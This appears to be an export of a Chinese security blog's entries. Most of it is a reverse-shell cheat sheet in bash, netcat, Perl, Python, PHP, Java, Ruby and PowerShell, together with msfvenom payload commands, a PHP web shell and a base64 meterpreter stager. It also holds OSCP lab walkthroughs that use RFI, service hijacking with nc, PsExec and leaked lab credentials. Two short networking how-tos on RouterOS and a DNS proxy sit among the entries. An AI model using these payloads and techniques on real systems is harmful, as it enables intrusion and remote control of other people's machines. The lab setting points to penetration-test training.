    
    <entry>
      <title>反弹shell与生成shell</title>
      <link href="447c13f4102f/"/>
      <url>447c13f4102f/</url>
      
        <content type="html"><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="0x01-bash-版本："><a href="#0x01-bash-版本：" class="headerlink" title="0x01 bash 版本："></a>0x01 bash 版本：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>注意这个是由解析 shell 的 bash 完成，所以某些情况下不支持。我用 zsh 不能反弹。这个也是最常用的。</p><h2 id="0x02-nc-版本："><a href="#0x02-nc-版本：" class="headerlink" title="0x02 nc 版本："></a>0x02 nc 版本：</h2><p>支持 - e 选项</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh attackerip 1234</span><br></pre></td></tr></table></figure><p>这个方式最简单 不能使用 - e 选项时：</p><p> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line">/bin/sh | nc attackerip 4444</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/</span><br></pre></td></tr></table></figure><p> </p><p>安装的 NC 版本有问题时：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h2 id="0x03-Telnet-版本：-nc-不可用或-dev-tcp-不可用时"><a href="#0x03-Telnet-版本：-nc-不可用或-dev-tcp-不可用时" class="headerlink" title="0x03 Telnet 版本：(nc 不可用或 / dev/tcp 不可用时)"></a>0x03 Telnet 版本：(nc 不可用或 / dev/tcp 不可用时)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet attackerip 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><p> </p><h2 id="0x04-Perl-版本："><a href="#0x04-Perl-版本：" class="headerlink" title="0x04 Perl 版本："></a>0x04 Perl 版本：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr\_in($p,inet\_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><p>不依赖于/bin/sh的shell:这条语句比上面的更为简短，而且确实不需要依赖/bin/sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$\_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure><h2 id="0x05-Python-版本："><a href="#0x05-Python-版本：" class="headerlink" title="0x05 Python 版本："></a>0x05 Python 版本：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\[&quot;/bin/sh&quot;,&quot;-i&quot;\]);&#x27;</span><br></pre></td></tr></table></figure><p>另外的形式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;exec(\\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;127.0.0.1&#x27;,9000))</span><br><span class="line">while 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\&quot;)&quot;</span><br></pre></td></tr></table></figure><p>另外 Metasploit 版的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -f raw -p python/meterpreter/reverse\_tcp LHOST=192.168.90.1 LPORT=1234</span><br><span class="line">import base64; exec(base64.b64decode(&#x27;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg==&#x27;))</span><br></pre></td></tr></table></figure><h2 id="0x06-php-版本："><a href="#0x06-php-版本：" class="headerlink" title="0x06 php 版本："></a>0x06 php 版本：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.40/4444 0&gt;&amp;1&#x27;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system($\_GET\[&#x27;cmd&#x27;\]);?&gt;</span><br><span class="line">&lt;? phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>use system rather than exec or passthru or shell_exec</p><h2 id="0x07-java-版本："><a href="#0x07-java-版本：" class="headerlink" title="0x07 java 版本："></a>0x07 java 版本：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec(\[&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;\] as String\[\])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="0x08-ruby-版本："><a href="#0x08-ruby-版本：" class="headerlink" title="0x08 ruby 版本："></a>0x08 ruby 版本：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to\_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure><p>不依赖于/bin/sh 的 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)io|c.print io.readend&#x27;</span><br></pre></td></tr></table></figure><p>如果目标系统运行 Windows：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)io|c.print io.readend&#x27;</span><br></pre></td></tr></table></figure><h2 id="0x09-crontab-定时任务："><a href="#0x09-crontab-定时任务：" class="headerlink" title="0x09 crontab 定时任务："></a>0x09 crontab 定时任务：</h2><p>这也是在 redis 未授权访问的时候使用过的。 crontab -e 编辑当前用户的任务，或者是写到计划任务目录，一般是 / var/spool/cron / 目录，ubuntu 是 / var/spool/cron/crontabs。文件名为用户名 root 等。下面命令含义是每一分钟执行一次反弹 shell 命令。具体 crontab 用法可以参考 <a href="http://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">Crontab 定时任务配置</a></p><p>/bin/bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</p><h2 id="0x10-One-Line-Powershell版本："><a href="#0x10-One-Line-Powershell版本：" class="headerlink" title="0x10 One Line Powershell版本："></a>0x10 One Line Powershell版本：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -command &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;182.148.157.242&#x27;,5000);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure><h1 id="生成shell"><a href="#生成shell" class="headerlink" title="生成shell"></a>生成shell</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; m -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; m -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><h2 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a><strong>Mac</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><h1 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><strong>PHP</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><h2 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a><strong>ASP</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a><strong>JSP</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><h2 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a><strong>WAR</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><h1 id="Scripting-Payloads"><a href="#Scripting-Payloads" class="headerlink" title="Scripting Payloads"></a><strong>Scripting Payloads</strong></h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a><strong>Python</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse\_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a><strong>Bash</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse\_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a><strong>Perl</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse\_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><p>For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p><h2 id="Linux-Based-Shellcode"><a href="#Linux-Based-Shellcode" class="headerlink" title="Linux Based Shellcode"></a><strong>Linux Based Shellcode</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="Windows-Based-Shellcode"><a href="#Windows-Based-Shellcode" class="headerlink" title="Windows Based Shellcode"></a><strong>Windows Based Shellcode</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="Mac-Based-Shellcode"><a href="#Mac-Based-Shellcode" class="headerlink" title="Mac Based Shellcode"></a><strong>Mac Based Shellcode</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell\_reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.8 凤凰攻略</title>
      <link href="ce7b90b81dd4/"/>
      <url>ce7b90b81dd4/</url>
      
        <content type="html"><![CDATA[<p>这台机子使用了一个Advance Comment System的webapp</p><p>Advance Comment System有RFI漏洞</p><p>具体链接</p><p><a href="http://10.11.1.8/internal/advanced/_comment/_system/index.php?ACS%5C_path=http://10.11.0.222/evil.txt">http://10.11.1.8/internal/advanced\_comment\_system/index.php?ACS\_path=http://10.11.0.222/evil.txt</a>?</p><?php echo shell\_exec("bash -i >& /dev/tcp/10.11.0.222/443 0>&1;");?><p>可以让机器执行<a href="http://10.11.0.222/evil.txt%E7%9A%84php%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E6%8C%87%E4%BB%A4">http://10.11.0.222/evil.txt的php代码中的指令</a></p><p>在攻击机器上nc -lvp 443就可以获得的权限的shell</p><p>但是此时获得的shell不是TTY的shell，所以需要转成TTY的shell</p><p>发现目标机器上安装了python，于是</p><p>python -c ‘import pty; pty.spawn(“/bin/sh”)’</p><p>将其转换为TTY</p><p>使用linuxprivchecker扫描该机器，勋在可以提权的点</p><p><a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/linuxprivchecker.zip">linuxprivchecker</a></p><p> </p><p>经过linuxprivchecker检查发现目标系统为Centos4.8</p><p>非常老的版本了，很可能存在提权漏洞</p><p>搜索发现存在Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - ‘sock_sendpage()’ Local Privilege Escalation 漏洞</p><p><a href="https://www.exploit-db.com/exploits/9545/">https://www.exploit-db.com/exploits/9545/</a></p><p>下载源代码，编译</p><p>gcc -Wall -m32 -o exploit 9545.c -Wl,–hash-style=both</p><p>如果是64位的kali，需要 apt-get install gcc-multilib 安装缺少的32位库。</p><p>由于目标系统较老，一些依赖和库也是较老的，所以我们需要在攻击机上编译好程序，并且加上红色字体的代码，静态编译链接库，才能让提权程序在目标机器上运行</p><p>编译完成之后将程序下载到目标机器上，执行。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20180511070342.png"></p><p>root shell get！</p><p><strong>proof.txt</strong> f56a325ef00d4553a4046b7eacc5d667</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSCP线索及成果</title>
      <link href="81ce2a81c855/"/>
      <url>81ce2a81c855/</url>
      
        <content type="html"><![CDATA[<iframe src="//music.163.com/outchain/player?type=2&amp;id=26624725&amp;auto=1&amp;height=66" width="330" height="86" frameborder="no" marginwidth="0" marginheight="0"><span data-mce-type="bookmark" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" class="mce_SELRES_start">﻿</span></iframe><h1 id="10-11-1-5"><a href="#10-11-1-5" class="headerlink" title="10.11.1.5"></a>10.11.1.5</h1><p><strong>存在漏洞</strong> MS03-026 MS03-026</p><p><strong>proof.txt</strong> ed20b785808f615be2c588ed925b18ce</p><p><strong>登录帐号</strong> alice密码aliceishere</p><p><strong>额外发现</strong> bank-account.zip 解压密码alice</p><p><strong>内含文件</strong>:<a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/bank-account.xls">bank-account</a></p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20180127212444.png"></p><h1 id="10-11-1-7"><a href="#10-11-1-7" class="headerlink" title="10.11.1.7"></a>10.11.1.7</h1><p>需要后期发现帐号及密码</p><h1 id="10-11-1-8"><a href="#10-11-1-8" class="headerlink" title="10.11.1.8"></a>10.11.1.8</h1><p><a href="https://wp.jinzz.cc/?p=530">https://wp.jinzz.cc/?p=530</a></p><h1 id="10-11-1-10"><a href="#10-11-1-10" class="headerlink" title="10.11.1.10"></a>10.11.1.10</h1><p><a href="https://wp.jinzz.cc/?p=579">https://wp.jinzz.cc/?p=579</a></p><h1 id="10-11-1-13-10-11-1-14"><a href="#10-11-1-13-10-11-1-14" class="headerlink" title="10.11.1.13/10.11.1.14"></a>10.11.1.13/10.11.1.14</h1><p><strong>存在漏洞</strong>: FTP未合理设置上传权限,可以上传木马至网页根目录</p><p>利用msfvenom生成asp木马文件</p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.222 LPORT=4444 -f asp &gt; 1.asp</p><p>使用windwos机子将木马文件上传至目标机器.访问10.11.1.13/1.asp同时Kali在后台生成监听端口</p><p>即可得到反弹的低权限shell</p><p>得到低权限反弹shell之后使用<a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/accesschk.zip">accesschk</a>来检查各个文件及服务有没有misconfigration</p><p>accesschk.exe /accepteula -uwcqv IWAM_BOB *</p><p>发现SSDPSRV和upnphost这两个服务存在误配置</p><p>命令行修改SSDPSRV所运行的.exe文件为我们想要运行的文件</p><p>sc config SSDPSRV binpath= “c:\inetpub\wwwroot\nc.exe -nv 10.11.0.222 9090 -e cmd.exe”<br>sc config SSDPSRV obj= “.\LocalSystem” password= “”<br>sc config SSDPSRV start= “demand”  //mmp没文章要说加这个命令,查了google上某国人文章才知道,原来的服务是被disable的!!!妈的我居然忽略了报错信息!!! 3小时—RIP<br>net start SSDPSRV</p><p>SYSTEM shell get√</p><p><strong>proof.txt</strong> a26f37da4583ff68f44d133d12ae3459</p><p>参考:<a href="http://fuzzysecurity.com/tutorials/16.html">http://fuzzysecurity.com/tutorials/16.html</a></p><h1 id="10-11-1-22"><a href="#10-11-1-22" class="headerlink" title="10.11.1.22"></a>10.11.1.22</h1><p><strong>存在漏洞</strong>:Samba 2.2.x - ‘call_trans2open’ Remote Buffer Overflow</p><p>exploitDB上有漏洞利用源码,msfconsole里直接有ruby脚本</p><p>使用,拿到shell√</p><p><strong>proof.txt</strong> da690f91f46eb888719fe942efed2993</p><p> </p><h1 id="10-11-1-24"><a href="#10-11-1-24" class="headerlink" title="10.11.1.24"></a>10.11.1.24</h1><p><strong>存在漏洞 :</strong> web界面管理员密码与linux账户管理员密码都为弱密码</p><p>发现后台管理员面板10.11.1.24/admin 帐号密码为弱密码admin</p><p>尝试上传文件,发现有上传文件扩展名限制,不能上传.php文件</p><p>尝试上传.PHP文件,成功</p><p>用msfvenom编译php shellcode发现问题,尝试第三方webshell</p><p>使用b374k webshell  <a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/b374k.zip">b374k</a></p><p><a href="https://github.com/b374k/b374k#b374k-shell-32">https://github.com/b374k/b374k#b374k-shell-32</a> 编译webshell,上传,得到低权限交互界面</p><p>cat /etc/passwd</p><p>发现疑似管理员帐号patrick</p><p>按照之前获取CMS密码的经验尝试账户名为密码登录</p><p>成功登录</p><p>shell get √</p><p><strong>proof.txt</strong> c19cf7756cfef80636d95d9e73ef4a2e</p><p> </p><h1 id="10-11-1-31"><a href="#10-11-1-31" class="headerlink" title="10.11.1.31"></a>10.11.1.31</h1><p><a href="https://wp.jinzz.cc/?p=618">https://wp.jinzz.cc/?p=618</a></p><h1 id="10-11-1-35"><a href="#10-11-1-35" class="headerlink" title="10.11.1.35"></a>10.11.1.35</h1><p><a href="https://wp.jinzz.cc/?p=627">https://wp.jinzz.cc/?p=627</a></p><h1 id="10-11-1-39"><a href="#10-11-1-39" class="headerlink" title="10.11.1.39"></a>10.11.1.39</h1><p><a href="https://wp.jinzz.cc/?p=662">https://wp.jinzz.cc/?p=662</a></p><h1 id="10-11-1-44"><a href="#10-11-1-44" class="headerlink" title="10.11.1.44"></a>10.11.1.44</h1><p>需要后期发现</p><p> </p><h1 id="10-11-1-49-50"><a href="#10-11-1-49-50" class="headerlink" title="10.11.1.49/50"></a>10.11.1.49/50</h1><p>nmap快速扫描结果并不准确！需要对所有端口进行扫描</p><p>发现存在9505端口。</p><p>浏览器直接访问，发现存在HFS文件分享系统。</p><p>MSF现成利用脚本 windows/http/rejetto_hfs_exec</p><p>目标机器打开了防火墙，所以记得把LPORT改成443</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20180608080820.png"></p><p>可以得到地权限的shell</p><p><img src="/images/1-1.png"></p><p>net user 查看一下存在的用户，发现存在alice。</p><p>而alice是实验室的地一台机子且已经被我们拿下，已知那台机子alice的密码是aliceishere，可能这台机子上也是这个密码。</p><p>我们向目标机器上传PsExec.exe文件和nc.exe    link: <a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/PsExec.zip">PsExec</a>  <a href="http://wp.jinzz.cc/wp-content/uploads/2018/05/nc.zip">nc</a></p><p>PsExec.exe -accpeteula \\Bethany2 -ua alice -pa aliceishere C:\HFS\nc.exe -vn 10.11.0.94 443 -e cmd.exe</p><p><img src="/images/2-1.png"></p><p><img src="/images/3-1.png"></p><p>shell get √</p><p><strong>proof.txt</strong> 1f1f1eb58e44d5d24e44070b3b29c0d5</p><p> </p><h1 id="10-11-1-71"><a href="#10-11-1-71" class="headerlink" title="10.11.1.71"></a>10.11.1.71</h1><p><a href="https://forums.offensive-security.com/showthread.php?t=4689">https://forums.offensive-security.com/showthread.php?t=4689</a></p><p> </p><h1 id="10-11-1-72"><a href="#10-11-1-72" class="headerlink" title="10.11.1.72"></a>10.11.1.72</h1><p>mail管理系统弱密码 root root</p><p>发现ryuu账户有一份邮件包含了ssh登录密码</p><p>username: ryuu password: QUHqhUPRKXMo4m7k</p><p>break rbash：<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p><p>hacker@beta:~$ BASH_CMDS[a]=/bin/sh;a</p><p>hacker@beta:~$ export PATH=$PATH:/bin/</p><p>hacker@beta:~$ export PATH=$PATH:/usr/bin</p><p> </p><h1 id="10-11-1-115"><a href="#10-11-1-115" class="headerlink" title="10.11.1.115"></a>10.11.1.115</h1><p>enum4linux扫描一下，发现低版本的samba 2.2.7</p><p><a href="https://www.exploit-db.com/exploits/10/">https://www.exploit-db.com/exploits/10/</a></p><p>编译运行</p><p><img src="/images/1-2.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RouterOS使用vpn国内外流量分流</title>
      <link href="ac12b9b74ea5/"/>
      <url>ac12b9b74ea5/</url>
      
        <content type="html"><![CDATA[<h2 id="所需文件"><a href="#所需文件" class="headerlink" title="所需文件"></a>所需文件</h2><p><strong>WinBox</strong>:<a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/winbox.zip">winbox</a></p><p><strong>rsc脚本</strong>:<a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/2017-12-31ChinaIP.zip">2017-12-31ChinaIP</a> <a href="https://wp.jinzz.cc/wp-content/uploads/2018/01/2018-9-22ChinaIP.zip">2018-9-22ChinaIP</a></p><p>打开winbox连接上路由器</p><p><strong>第一步</strong>:先检查nat以及防火墙过滤规则是否配置正确,能否正常上网</p><p><strong>第二步</strong>:导入rsc文件至RB中</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20180126091642.png"></p><p><strong>第三步</strong>:打开RB的Terminal执行rsc脚本文件</p><p>import file=2017-12-31ChinaIP.rsc</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20180126091742.png"></p><p><strong>第四步</strong>:进入Firewall设置流量标记规则</p><p>首先设置Chian为prerouting</p><p>在将Dst.Address List设置为! novpn</p><p>再将Dst.Address Type 的Adress Type设置为local并且勾选invert</p><p>再将Action改为mark routing 并新建New mark routing 为vpn</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20180126092002.png"> <img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20180126092031.png"> <img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20180126092039.png"> <img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20180126092045.png"></p><p>防火墙标记相关的步骤完成</p><p><strong>第五步</strong>:添加vpn连接以及默认路由</p><p>添加需要的vpn连接</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20180126092451.png"></p><p>新建一条路由规则并按如下图配置</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20180126092507.png"></p><p><strong>第六步</strong>:配置DNS服务器为个人搭建的125.71.5.35</p><p>至此完成所有步骤</p><p>连接该路由器的用户可以获得最佳的网络体验</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>自建防DNS污染服务器(Windows)</title>
      <link href="3c2ccdbb58cb/"/>
      <url>3c2ccdbb58cb/</url>
      
        <content type="html"><![CDATA[<p>Github项目地址:<a href="https://github.com/chengr28/Pcap/_DNSProxy">https://github.com/chengr28/Pcap\_DNSProxy</a></p><p>前置需求软件WinPcap:<a href="https://www.winpcap.org/install/default.htm">https://www.winpcap.org/install/default.htm</a></p><p>下载解压到任意盘符</p><p>以管理员身份运行</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720180126090836.png"></p><p>安装后修改网卡DNS首选服务器为127.0.0.1</p><p>修改Config.ini文件</p><p>Operation Mode = Server</p><p>Outgoing Protocol = IPv4 + TCP</p><p>Local Protocol = IPv4 + TCP</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>msfvenom</title>
      <link href="59309b0f455d/"/>
      <url>59309b0f455d/</url>
      
        <content type="html"><![CDATA[<h4 id="List-payloads"><a href="#List-payloads" class="headerlink" title="List payloads"></a>List payloads</h4><table><tbody><tr><td class="code"><pre class="bash">msfvenom -l</pre></td></tr></tbody></table><h4 id="Binaries"><a href="#Binaries" class="headerlink" title="Binaries"></a>Binaries</h4><p><strong>Linux</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</pre></td></tr></tbody></table><p><strong>Windows</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</pre></td></tr></tbody></table><p><strong>Mac</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</pre></td></tr></tbody></table><h4 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h4><p><strong>PHP</strong></p><table><tbody><tr><td class="code"><pre class="bash">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; 